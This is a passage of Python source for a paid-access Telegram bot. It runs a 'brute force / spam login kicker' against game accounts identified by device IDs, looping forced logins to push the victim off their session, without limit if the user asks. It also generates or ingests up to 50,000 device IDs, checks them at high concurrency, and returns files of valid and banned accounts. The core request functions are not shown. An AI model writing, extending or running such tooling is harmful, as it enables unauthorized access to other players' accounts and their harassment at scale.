            active_list = "  No active devices."
        else:
            active_list = "\n".join(
                f"  {i}. {d[:60]}..." if len(d) > 60 else f"  {i}. {d}"
                for i, d in enumerate(active_devices, 1)
            )

        await update.message.reply_text(
            f"📱 My Bruteforce Devices\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Concurrent Limit: {len(active_devices)}/{max_devices}\n"
            f"Remaining Slots: {max(0, max_devices - len(active_devices))}\n"
            f"⚡ Active Kickers: {active_count}\n\n"
            f"Active Devices:\n{active_list}\n\n"
            f"📜 Lifetime History: {len(lifetime_devices)} device(s)"
        )

    # ────────────────────────────────────────────────────────────────
    # CHECK FILE / GENERATE
    # ────────────────────────────────────────────────────────────────

    async def check_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._check_access(user_id):
            await update.callback_query.answer("❌ No access. /redeem <KEY>", show_alert=True)
            return
        if user_id in self.active_tasks and not self.active_tasks[user_id]['done']:
            await update.callback_query.answer("Task running!", show_alert=True)
            return
        await update.callback_query.answer()
        await update.callback_query.edit_message_text("📁 Send .txt file with device IDs (one per line).")
        context.user_data['mode'] = 'file'

    async def generate(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._check_access(user_id):
            await update.callback_query.answer("❌ No access. /redeem <KEY>", show_alert=True)
            return
        if user_id in self.active_tasks and not self.active_tasks[user_id]['done']:
            await update.callback_query.answer("Task running!", show_alert=True)
            return
        await update.callback_query.answer()
        context.user_data['mode'] = 'generate'
        await update.callback_query.edit_message_text("🎲 How many IDs? Send a number (1-50000)")

    async def my_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        is_admin = self._is_admin(user_id)
        expiry = key_manager.get_expiry(user_id)
        has_access = self._check_access(user_id)
        max_devices = key_manager.get_device_limit(user_id)
        active_devices = key_manager.get_device_count(user_id)
        active_count = self._bf_user_active_count(user_id)
        if is_admin:
            status = "Role: Admin (Unlimited)"
        elif has_access:
            status = f"Active until: {expiry}"
        else:
            status = "No access\n/redeem <KEY>"
        await query.edit_message_text(
            f"📋 My Status\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"ID: {user_id}\n"
            f"{status}\n\n"
            f"📱 Concurrent Limit: {active_devices}/{max_devices}\n"
            f"⚡ Active Kickers: {active_count}"
        )

    # ────────────────────────────────────────────────────────────────
    # ADMIN PANEL
    # ────────────────────────────────────────────────────────────────

    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("❌ Admin only.", show_alert=True)
            return
        await query.answer()
        keys = key_manager.list_keys(show_used=False)
        users = key_manager.list_users()
        active_users = sum(1 for u in users if u["active"])
        active_kickers = self._count_active_kickers()
        keyboard = [
            [InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey")],
            [InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys")],
            [InlineKeyboardButton("👥 List Users", callback_data="admin_listusers")],
            [InlineKeyboardButton("📱 Device Limits", callback_data="admin_devlimits")],
            [InlineKeyboardButton("◀ Back", callback_data="back_main")]
        ]
        await query.edit_message_text(
            f"🔑 Admin Panel\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Unused Keys: {len(keys)}\n"
            f"Total Users: {len(users)}\n"
            f"Active: {active_users}\n"
            f"⚡ Active Kickers: {active_kickers}\n\n"
            f"/genkey <dur> | /listkeys | /listusers\n"
            f"/revoke <uid> | /delkey <key>\n"
            f"/setdevlimit | /adddevlimit | /checkdevlimit\n"
            f"/resetdevlimit | /listdevlimits | /activekickers",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def admin_genkey_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("❌", show_alert=True)
            return
        await query.answer()
        keyboard = [
            [
                InlineKeyboardButton("1 Hour", callback_data="genkey_1h"),
                InlineKeyboardButton("6 Hours", callback_data="genkey_6h"),
                InlineKeyboardButton("12 Hours", callback_data="genkey_12h"),
            ],
            [
                InlineKeyboardButton("1 Day", callback_data="genkey_1d"),
                InlineKeyboardButton("3 Days", callback_data="genkey_3d"),
                InlineKeyboardButton("7 Days", callback_data="genkey_7d"),
            ],
            [
                InlineKeyboardButton("14 Days", callback_data="genkey_14d"),
                InlineKeyboardButton("1 Month", callback_data="genkey_1m"),
                InlineKeyboardButton("3 Months", callback_data="genkey_3m"),
            ],
            [
                InlineKeyboardButton("6 Months", callback_data="genkey_6m"),
                InlineKeyboardButton("1 Year", callback_data="genkey_1y"),
            ],
            [InlineKeyboardButton("◀ Back", callback_data="admin_panel")]
        ]
        await query.edit_message_text("🔑 Generate Key\nSelect duration:", reply_markup=InlineKeyboardMarkup(keyboard))

    async def admin_listkeys_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("❌", show_alert=True)
            return
        await query.answer()
        keys = key_manager.list_keys(show_used=False)
        if not keys:
            text = "No unused keys."
        else:
            lines = [f"🔑 Unused Keys ({len(keys)}):\n"]
            for k in keys[:15]:
                lines.append(f"{k['key']} — {k['label']}")
            text = "\n".join(lines)
        keyboard = [[InlineKeyboardButton("◀ Back", callback_data="admin_panel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    async def admin_listusers_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("❌", show_alert=True)
            return
        await query.answer()
        users = key_manager.list_users()
        if not users:
            text = "No users."
        else:
            lines = [f"👥 Users ({len(users)}):\n"]
            for u in users[:15]:
                s = "✅" if u["active"] else "❌"
                lines.append(f"{s} {u['uid']} | {u['expires']}")
            text = "\n".join(lines)
        keyboard = [[InlineKeyboardButton("◀ Back", callback_data="admin_panel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    async def admin_devlimits_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("❌", show_alert=True)
            return
        await query.answer()
        limits = key_manager.list_device_limits()
        if not limits:
            text = (
                "📱 Device Limits\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "No custom limits set.\nAll users default to 1.\n\n"
                "Use /setdevlimit <uid> <n> to set."
            )
        else:
            lines = ["📱 Device Limits\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"]
            for item in sorted(limits, key=lambda x: x['limit'], reverse=True)[:15]:
                lines.append(
                    f"👤 {item['uid']} — {item['limit']} (active {item['used']})"
                )
            text = "\n".join(lines)
        keyboard = [[InlineKeyboardButton("◀ Back", callback_data="admin_panel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    # ────────────────────────────────────────────────────────────────
    # BRUTE FORCE COMMANDS
    # ────────────────────────────────────────────────────────────────

    async def bf_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._check_access(user_id):
            await update.message.reply_text("❌ No access. Use /redeem <KEY>")
            return

        if not context.args:
            await update.message.reply_text(
                "⚡ Brute Force / Spam Login Kicker\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Usage: /bf <device_id>\n"
                "Example: /bf and_abc123def456...\n\n"
                "You can run MULTIPLE kickers at once, up to your "
                "concurrent device limit.\n\n"
                "Use /mydevices to check your limit."
            )
            return

        device_id = context.args[0].strip()
        if len(device_id) < 40:
            await update.message.reply_text("❌ Device ID too short. Must be at least 40 chars.")
            return

        # Check if THIS specific device is already running
        if self._bf_is_active(user_id, device_id):
            await update.message.reply_text(
                "⚠️ You already have a kicker running for this device!\n"
                "Use /bfstatus to check it or /stop_bf to stop it first."
            )
            return

        # ── CHECK CONCURRENT DEVICE LIMIT ──
        max_devices = key_manager.get_device_limit(user_id)
        running_count = self._bf_user_active_count(user_id)

        if running_count >= max_devices:
            running_devices = self._bf_user_active_devices(user_id)
            devices_display = "\n".join(
                f"  • {d[:50]}..." for d in running_devices[:5]
            )
            await update.message.reply_text(
                f"⚠️ Concurrent Limit Reached!\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Your limit: {max_devices} concurrent device(s)\n"
                f"Currently active: {running_count}\n\n"
                f"Active devices:\n{devices_display}\n\n"
                f"Stop a kicker with /stop_bf to free up a slot."
            )
            return

        status_msg = await update.message.reply_text(
            f"🔍 Verifying device ID...\n{device_id}"
        )

        loop = asyncio.get_event_loop()
        try:
            profile = await asyncio.wait_for(
                loop.run_in_executor(None, fetch_session_profile, device_id),
                timeout=30.0
            )
        except asyncio.TimeoutError:
            await status_msg.edit_text("❌ Verification timed out. Device may be dead or network is slow.")
            return

        if not profile:
            await status_msg.edit_text(
                "❌ Invalid Device ID, dead, or login failed!\n"
                "Please check the device ID and try again."
            )
            return

        # Register device as ACTIVE (freed when kicker stops) + LIFETIME (for admin ref)
        key_manager.add_user_device(user_id, device_id)
        key_manager.add_lifetime_device(user_id, device_id)
        logger.info(f"Registered device for user {user_id}: {device_id[:30]}...")

        self.bf_profiles[(user_id, device_id)] = profile

        if is_banned_status(profile.get('ban_status')):
            ban_line = f"🚫 Status      : {profile['ban_status']}\n"
        else:
            ban_line = f"✅ Status      : NORMAL\n"

        profile_text = (
            f"📋 Account Profile\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 Nickname    : {profile['nickname']}\n"
            f"🆔 Account     : {profile['account_id']}\n"
            f"🌍 Zone        : {profile['zone_id']}\n"
            f"📊 Level       : {profile['level']}\n"
            f"🏆 Rank        : {profile['rank']}\n"
            f"🌟 Highest     : {profile['highest_rank']}\n"
            f"🎨 Skins       : {profile['skin_count']}\n"
            f"🦸 Heroes      : {profile['hero_count']}\n"
            f"🔐 V2L Status  : {profile.get('v2l_status', 'N/A')}\n"
            f"📅 Created     : {profile.get('created_at', 'N/A')}\n"
            f"{ban_line}"
            f"⚡ Active      : {running_count + 1}/{max_devices}\n"
        )

        dev_short = device_id[-8:]
        keyboard = [
            [InlineKeyboardButton("🧪 Single Test", callback_data=f"bf_s|{dev_short}")],
            [InlineKeyboardButton("⚡ 10x Kick", callback_data=f"bf_10|{dev_short}")],
            [InlineKeyboardButton("🚀 50x Kick", callback_data=f"bf_50|{dev_short}")],
            [InlineKeyboardButton("💥 100x Kick", callback_data=f"bf_100|{dev_short}")],
            [InlineKeyboardButton("♾️ Unlimited (until stop)", callback_data=f"bf_inf|{dev_short}")],
            [InlineKeyboardButton("🛠️ Custom", callback_data=f"bf_cus|{dev_short}")],
            [InlineKeyboardButton("🛑 Stop", callback_data=f"bf_stp|{dev_short}")],
        ]

        context.user_data['bf_device_map'] = context.user_data.get('bf_device_map', {})
        context.user_data['bf_device_map'][dev_short] = device_id

        try:
            await status_msg.edit_text(
                profile_text,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except BadRequest as e:
            logger.error(f"bf_cmd edit_text failed: {e}")
            await update.message.reply_text(profile_text, reply_markup=InlineKeyboardMarkup(keyboard))

    async def bf_start_kick(self, update: Update, context: ContextTypes.DEFAULT_TYPE,
                            total_loops: int, delay_sec: float, device_id: str):
        query = update.callback_query
        user_id = query.from_user.id
        await query.answer()

        profile = self.bf_profiles.get((user_id, device_id))
        if not profile:
            try:
                await query.edit_message_text("❌ Session expired. Use /bf <device_id> again.")
            except BadRequest:
                pass
            return

        key = (user_id, device_id)

        async with self.bf_running_lock:
            if self._bf_is_active(user_id, device_id):
                try:
                    await query.answer("⚠️ Kicker already running for this device! Use /stop_bf.", show_alert=True)
                except Exception:
                    pass
                return
            self.bf_cancel_flags[key] = False
            self.bf_running[key] = {
                'started_at': time.time(),
                'total_loops': total_loops,
                'delay': delay_sec,
                'count': 0,
                'success': 0,
                'failed': 0,
                'last_latency': 0.0,
                'last_update': 0.0,
                'status': 'active',
                'profile': profile,
                'last_status': 'Initializing...',
                'device_id': device_id,
                'user_id': user_id,
            }
        cancel_flag = self.bf_cancel_flags

        loop_label = f"{total_loops:,} loops" if total_loops > 0 else "♾️ Unlimited"
        dev_short = device_id[-8:]
        keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"bf_stp|{dev_short}")]]
        try:
            await query.edit_message_text(
                f"⚡ Kicker Active ({loop_label} | Delay {delay_sec}s)\n"
                f"Target: {profile['nickname']} (ID: {profile['account_id']})\n"
                f"Press 🛑 STOP button to cancel.",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except BadRequest as e:
            logger.error(f"bf_start_kick edit failed: {e}")

        chat_id = query.message.chat_id
        msg_id = query.message.message_id

        async def _runner():
            last_edit = [0.0]

            async def progress_cb(count, success_count, fail_count, lat, desc):
                st = self.bf_running.get(key)
                if st is not None:
                    st['count'] = count
                    st['success'] = success_count
                    st['failed'] = fail_count
                    st['last_latency'] = lat
                    st['last_update'] = time.time()
                    st['last_status'] = desc

                now = time.time()
                if now - last_edit[0] < 2.0:
                    return
                last_edit[0] = now
                loop_str = f"{count}/{total_loops}" if total_loops > 0 else f"{count}/∞"
                speed = count / (now - st['started_at']) if st and (now - st['started_at']) > 0 else 0
                succ_pct = (success_count / count * 100) if count > 0 else 0
                text = (
                    f"⚡ Kicker Active\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"👤 {profile['nickname']} (ID: {profile['account_id']})\n"
                    f"🔄 Loop: {loop_str}\n"
                    f"✅ Success: {success_count} ({succ_pct:.1f}%)\n"
                    f"❌ Failed: {fail_count}\n"
                    f"⚡ Last latency: {lat:.0f}ms\n"
                    f"🚀 Speed: {speed:.2f}/s\n"
                    f"📡 Last: {desc}\n\n"
                    f"Press 🛑 STOP to cancel."
                )
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=msg_id,
                        text=text,
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                except BadRequest:
                    pass
                except Exception:
                    pass

            try:
                summary = await run_kick_loop(
                    profile, total_loops, delay_sec,
                    progress_cb=progress_cb,
                    cancel_check=lambda: cancel_flag.get(key, True)
                )
            except Exception as e:
                logger.error(f"Kicker error: {e}")
                try:
                    await context.bot.send_message(chat_id, f"❌ Kicker error: {e}")
                except Exception:
                    pass
                self.bf_cancel_flags.pop(key, None)
                self.bf_running.pop(key, None)
                self.bf_tasks.pop(key, None)
                # Free up device slot on error too
                key_manager.remove_user_device(user_id, device_id)
                return

            duration = summary['duration']
            text = (
                f"📊 Kicker Summary\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👤 {profile['nickname']} (ID: {profile['account_id']})\n"
                f"⏱ Duration: {duration/60:.1f} min ({duration:.1f}s)\n"
                f"🔄 Total: {summary['count']:,}\n"
                f"✅ Success: {summary['success']:,} ({summary['success_pct']:.1f}%)\n"
                f"❌ Failed: {summary['failed']:,}\n"
                f"⚡ Avg latency: {summary['avg_latency']:.1f}ms\n"
                f"🚀 Speed: {summary['speed']:.2f} kick/s\n"
            )
            restart_kb = [[InlineKeyboardButton("🔁 Restart", callback_data=f"bf_10|{dev_short}")]]
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=msg_id,
                    text=text,
                    reply_markup=InlineKeyboardMarkup(restart_kb)
                )
            except BadRequest:
                try:
                    await context.bot.send_message(chat_id, text)
                except Exception:
                    pass
            except Exception:
                pass

            self.bf_cancel_flags.pop(key, None)
            self.bf_running.pop(key, None)
            self.bf_tasks.pop(key, None)
            # ── FREE UP THE DEVICE SLOT ──
            key_manager.remove_user_device(user_id, device_id)
            logger.info(f"Freed device slot for user {user_id}: {device_id[:30]}...")

        task = asyncio.create_task(_runner())
        self.bf_tasks[key] = task

    async def bfstatus_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        total_active = self._count_active_kickers()

        user_kickers = []
        for (uid, did), task in list(self.bf_tasks.items()):
            if uid != user_id:
                continue
            if task and not task.done():
                st = self.bf_running.get((uid, did))
                if st:
                    user_kickers.append(st)
            else:
                self.bf_tasks.pop((uid, did), None)
                self.bf_running.pop((uid, did), None)

        max_devices = key_manager.get_device_limit(user_id)
        active_devices = key_manager.get_device_count(user_id)

        if not user_kickers:
            await update.message.reply_text(
                "📊 Kicker Status\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🟢 Your kickers: NONE ACTIVE\n"
                f"🌐 Global active kickers: {total_active}\n"
                f"📱 Concurrent limit: {active_devices}/{max_devices}\n\n"
                "Use /bf <device_id> to start one."
            )
            return

        lines = [
            f"📊 Kicker Status\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🟢 Active Kickers: {len(user_kickers)}/{max_devices}\n"
            f"🌐 Global: {total_active}\n"
            f"📱 Concurrent: {active_devices}/{max_devices}\n"
        ]

        for i, st in enumerate(user_kickers, 1):
            elapsed = time.time() - st['started_at']
            total_loops = st['total_loops']
            loop_str = f"{st['count']}/{total_loops}" if total_loops > 0 else f"{st['count']}/∞"
            profile = st.get('profile', {})
            speed = (st['count'] / elapsed) if elapsed > 0 else 0.0
            succ_pct = (st['success'] / st['count'] * 100) if st['count'] > 0 else 0.0

            if total_loops > 0 and st['count'] > 0 and speed > 0:
                remaining = total_loops - st['count']
                eta = remaining / speed
                eta_str = f"{int(eta // 60)}m {int(eta % 60)}s"
            else:
                eta_str = "N/A"

            lines.append(
                f"\n━━━ #{i} ━━━\n"
                f"👤 {profile.get('nickname', 'Unknown')} "
                f"(ID: {profile.get('account_id', '?')})\n"
                f"🔄 Loop: {loop_str}\n"
                f"✅ {st['success']:,} ({succ_pct:.1f}%) | ❌ {st['failed']:,}\n"
                f"⚡ Last: {st['last_latency']:.0f}ms | 🚀 {speed:.2f}/s\n"
                f"📡 {st.get('last_status', 'N/A')}\n"
                f"⏱ {int(elapsed // 60)}m {int(elapsed % 60)}s | ⏳ {eta_str}"
            )

        lines.append("\n\nUse /stop_bf to stop all kickers.")
        await update.message.reply_text("\n".join(lines))

    async def stop_bf_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        stopped = 0
        for (uid, did), flag in list(self.bf_cancel_flags.items()):
            if uid == user_id:
                self.bf_cancel_flags[(uid, did)] = True
                stopped += 1
        if stopped > 0:
            await update.message.reply_text(f"🛑 Stop signal sent to {stopped} kicker(s).")
        else:
            await update.message.reply_text("ℹ️ No active kicker to stop.")

    # ────────────────────────────────────────────────────────────────
    # MESSAGE HANDLER
    # ────────────────────────────────────────────────────────────────

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id

        if context.user_data.get('bf_custom') and update.message.text:
            context.user_data['bf_custom'] = False
            device_id = context.user_data.get('bf_custom_device')
            context.user_data['bf_custom_device'] = None
            if not device_id:
                await update.message.reply_text("❌ Session expired. Use /bf <device_id> again.")
                return
            try:
                parts = update.message.text.strip().split()
                loops = int(parts[0]) if parts else 10
                delay = float(parts[1]) if len(parts) > 1 else 2.0
                if loops < 0:
                    loops = 0
                if delay < 0:
                    delay = 0.0
                profile = self.bf_profiles.get((user_id, device_id))
                if not profile:
                    await update.message.reply_text("❌ Session expired. Use /bf <device_id> again.")
                    return

                key = (user_id, device_id)

                async with self.bf_running_lock:
                    if self._bf_is_active(user_id, device_id):
                        await update.message.reply_text(
                            "⚠️ You already have a kicker running for this device! Use /stop_bf first."
                        )
                        return
                    self.bf_cancel_flags[key] = False
                    self.bf_running[key] = {
                        'started_at': time.time(),
                        'total_loops': loops,
                        'delay': delay,
                        'count': 0,
                        'success': 0,
                        'failed': 0,
                        'last_latency': 0.0,
                        'last_update': 0.0,
                        'status': 'active',
                        'profile': profile,
                        'last_status': 'Initializing...',
                        'device_id': device_id,
                        'user_id': user_id,
                    }
                cancel_flag = self.bf_cancel_flags

                loop_label = f"{loops:,} loops" if loops > 0 else "♾️ Unlimited"
                msg = await update.message.reply_text(
                    f"⚡ Kicker Active ({loop_label} | Delay {delay}s)\n"
                    f"Target: {profile['nickname']} (ID: {profile['account_id']})\n"
                    f"Send /stop_bf to cancel."
                )
                chat_id = msg.chat_id
                msg_id = msg.message_id

                async def _custom_runner():
                    state = {'last': 0.0}

                    async def progress_cb(count, success_count, fail_count, lat, desc):
                        st = self.bf_running.get(key)
                        if st is not None:
                            st['count'] = count
                            st['success'] = success_count
                            st['failed'] = fail_count
                            st['last_latency'] = lat
                            st['last_update'] = time.time()
                            st['last_status'] = desc

                        if time.time() - state['last'] < 2.0:
                            return
                        state['last'] = time.time()
                        loop_str = f"{count}/{loops}" if loops > 0 else f"{count}/∞"
                        speed = count / (time.time() - st['started_at']) if st and (time.time() - st['started_at']) > 0 else 0
                        succ_pct = (success_count / count * 100) if count > 0 else 0
                        try:
                            await context.bot.edit_message_text(
                                chat_id=chat_id, message_id=msg_id,
                                text=(
                                    f"⚡ Kicker Active\n"
                                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                                    f"👤 {profile['nickname']} (ID: {profile['account_id']})\n"
                                    f"🔄 Loop: {loop_str}\n"
                                    f"✅ Success: {success_count} ({succ_pct:.1f}%)\n"
                                    f"❌ Failed: {fail_count}\n"
                                    f"⚡ Last latency: {lat:.0f}ms\n"
                                    f"🚀 Speed: {speed:.2f}/s\n"
                                    f"📡 Last: {desc}\n\n"
                                    f"Send /stop_bf to cancel."
                                )
                            )
                        except BadRequest:
                            pass
                        except Exception:
                            pass

                    try:
                        summary = await run_kick_loop(
                            profile, loops, delay,
                            progress_cb=progress_cb,
                            cancel_check=lambda: cancel_flag.get(key, True)
                        )
                    except Exception as e:
                        logger.error(f"Custom kicker error: {e}")
                        try:
                            await context.bot.send_message(chat_id, f"❌ Kicker error: {e}")
                        except Exception:
                            pass
                        self.bf_cancel_flags.pop(key, None)
                        self.bf_running.pop(key, None)
                        self.bf_tasks.pop(key, None)
                        key_manager.remove_user_device(user_id, device_id)
                        return

                    duration = summary['duration']
                    try:
                        await context.bot.send_message(chat_id, (
                            f"📊 Kicker Summary\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"👤 {profile['nickname']} (ID: {profile['account_id']})\n"
                            f"⏱ Duration: {duration/60:.1f} min\n"
                            f"🔄 Total: {summary['count']:,}\n"
                            f"✅ Success: {summary['success']:,} ({summary['success_pct']:.1f}%)\n"
                            f"❌ Failed: {summary['failed']:,}\n"
                            f"⚡ Avg latency: {summary['avg_latency']:.1f}ms\n"
                            f"🚀 Speed: {summary['speed']:.2f} kick/s"
                        ))
                    except Exception:
                        pass
                    self.bf_cancel_flags.pop(key, None)
                    self.bf_running.pop(key, None)
                    self.bf_tasks.pop(key, None)
                    # ── FREE UP THE DEVICE SLOT ──
                    key_manager.remove_user_device(user_id, device_id)
                    logger.info(f"Freed device slot for user {user_id}: {device_id[:30]}...")

                task = asyncio.create_task(_custom_runner())
                self.bf_tasks[key] = task
            except (ValueError, IndexError):
                await update.message.reply_text(
                    "❌ Invalid format. Send: <loops> <delay>\nExample: 200 1.5"
                )
            return

        if context.user_data.get('mode') == 'generate' and update.message.text:
            if not self._check_access(user_id):
                await update.message.reply_text("❌ No access. /redeem <KEY>")
                return
            try:
                count = int(update.message.text)
                if count <= 0 or count > 50000:
                    await update.message.reply_text("Number between 1 and 50000")
                    return
                await update.message.reply_text(f"🎲 Generating {count:,} IDs...")
                context.user_data['mode'] = None
                asyncio.create_task(self.run_check_task(update, context, count, 'generate'))
            except ValueError:
                await update.message.reply_text("Send a valid number")
        elif update.message.document:
            if not self._check_access(user_id):
                await update.message.reply_text("❌ No access. /redeem <KEY>")
                return
            file = update.message.document
            if not file.file_name.endswith('.txt'):
                await update.message.reply_text("Send a .txt file")
                return
            status_msg = await update.message.reply_text(f"📥 Downloading {file.file_name}...")
            file_obj = await file.get_file()
            file_path = f"temp_{user_id}_{int(time.time())}.txt"
            await file_obj.download_to_drive(file_path)
            ids = _load_pool(file_path)
            os.remove(file_path)
            if not ids:
                await status_msg.edit_text("❌ No valid IDs found.")
                return
            await status_msg.edit_text(f"✅ Loaded {len(ids):,} IDs. Starting...")
            context.user_data['mode'] = None
            asyncio.create_task(self.run_check_task(update, context, ids, 'file'))

    # ────────────────────────────────────────────────────────────────
    # BULK CHECK TASK
    # ────────────────────────────────────────────────────────────────

    async def run_check_task(self, update: Update, context: ContextTypes.DEFAULT_TYPE, data, mode: str):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        self.active_tasks[user_id] = {'done': False, 'cancelled': False}
        stats = LiveStats()
        self.live_stats[user_id] = stats
        status_msg = None
        stats_msg = None
        try:
            if mode == 'generate':
                ids = [_gen() for _ in range(data)]
                limit = data
            else:
                ids = data[:]
                limit = len(ids)
            concurrency = 80
            rate = 80
            sem = asyncio.Semaphore(concurrency)
            bucket = _Bucket(rate)
            lock = asyncio.Lock()
            checked = 0
            valid = 0
            failed = 0
            banned = 0
            results = []
            banned_results = []
            start_time = time.monotonic()
            last_update = 0

            async def worker(did):
                nonlocal checked, valid, failed, banned
                if self.active_tasks[user_id]['cancelled']:
                    return
                res = await _check(did, sem, bucket)
                async with lock:
                    checked += 1
                    if not res:
                        failed += 1
                        stats.add_unreg()
                        return

                    if is_banned_status(res.get('ban_status')):
                        banned += 1
                        banned_results.append(res)
                        stats.add_banned(res)
                        return

                    valid += 1
                    results.append(res)
                    stats.add_hit(res)

            tasks = [asyncio.create_task(worker(did)) for did in ids]
            while not all(t.done() for t in tasks) and not self.active_tasks[user_id]['cancelled']:
                elapsed = time.monotonic() - start_time
                speed = checked / elapsed if elapsed > 0 else 0
                progress = (checked / limit * 100) if limit > 0 else 0
                eta = (limit - checked) / speed if speed > 0 else 0
                eta_m = int(eta // 60)
                eta_s = int(eta % 60)
                if time.monotonic() - last_update >= 2:
                    last_update = time.monotonic()
                    bar_len = 20
                    filled = int(progress / 100 * bar_len)
                    bar = '█' * filled + '░' * (bar_len - filled)
                    progress_text = (
                        f"⚡ [{bar}] {progress:.1f}%\n\n"
                        f"✅ {checked:,}/{limit:,} | 🟢 {valid:,}\n"
                        f"❌ {failed:,} | 🚫 {banned:,}\n"
                        f"⚡ {speed:.1f}/s\n"
                        f"⏱ {int(elapsed // 60)}m {int(elapsed % 60)}s | ⏳ {eta_m}m {eta_s}s\n"
                    )
                    stats_text = stats.format()
                    try:
                        if status_msg:
                            await status_msg.edit_text(progress_text)
                        else:
                            status_msg = await context.bot.send_message(chat_id, progress_text)
                    except BadRequest:
                        pass
                    except Exception:
                        pass
                    try:
                        if stats_msg:
                            await stats_msg.edit_text(stats_text)
                        else:
                            stats_msg = await context.bot.send_message(chat_id, stats_text)
                    except BadRequest:
                        pass
                    except Exception:
                        pass
                await asyncio.sleep(1)

            await asyncio.gather(*tasks, return_exceptions=True)
            self.active_tasks[user_id]['done'] = True
            elapsed = time.monotonic() - start_time

            if results:
                output_file = f"{len(results)}DevId_Valid.txt"
                with open(output_file, 'w', encoding='utf-8') as f:
                    for res in results:
                        f.write(format_result_line(res) + "\n")
                with open(output_file, 'rb') as f:
                    await context.bot.send_document(
                        chat_id, f,
                        filename=output_file,
                        caption=f"✅ Found {len(results):,} valid IDs!"
                    )
                os.remove(output_file)
            else:
                await context.bot.send_message(chat_id, "❌ No valid IDs found.")

            if banned_results:
                banned_file = f"{len(banned_results)}Banned_IDs.txt"
                with open(banned_file, 'w', encoding='utf-8') as f:
                    for res in banned_results:
                        f.write(format_banned_line(res) + "\n")
                with open(banned_file, 'rb') as f:
                    await context.bot.send_document(
                        chat_id, f,
                        filename=banned_file,
                        caption=f"🚫 Found {len(banned_results):,} banned accounts!"
                    )
                os.remove(banned_file)

            final_progress = (
                f"✅ Task Complete!\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Total checked : {checked:,}\n"
                f"Valid found   : {valid:,}\n"
                f"Banned        : {banned:,}\n"
                f"Failed        : {failed:,}\n"
                f"Success rate  : {(valid / checked * 100) if checked > 0 else 0:.2f}%\n"
                f"Total time    : {int(elapsed // 60)}m {int(elapsed % 60)}s\n"
                f"Avg speed     : {checked / elapsed:.1f}/s\n"
            )
            final_stats = (
                f"📊 Final Stats\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{stats.format()}"
            )
            try:
                if status_msg:
                    await status_msg.edit_text(final_progress)
                else:
                    await context.bot.send_message(chat_id, final_progress)
            except BadRequest:
                await context.bot.send_message(chat_id, final_progress)
            except Exception:
                pass
            try:
                if stats_msg:
                    await stats_msg.edit_text(final_stats)
                else:
                    await context.bot.send_message(chat_id, final_stats)
            except BadRequest:
                await context.bot.send_message(chat_id, final_stats)
            except Exception:
                pass

        except Exception as e:
            logger.error(f"Task error: {e}")
            try:
                await context.bot.send_message(chat_id, f"❌ Error: {str(e)}")
            except Exception:
                pass
        finally:
            self.active_tasks[user_id]['done'] = True
            self.live_stats.pop(user_id, None)

    # ────────────────────────────────────────────────────────────────
    # CALLBACK HANDLER
    # ────────────────────────────────────────────────────────────────

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        data = query.data

        try:
            if data == "check_file":
                await self.check_file(update, context)
            elif data == "generate":
                await self.generate(update, context)
            elif data == "my_status":
                await self.my_status(update, context)
            elif data == "my_devices":
                await query.answer()
                max_devices = key_manager.get_device_limit(user_id)
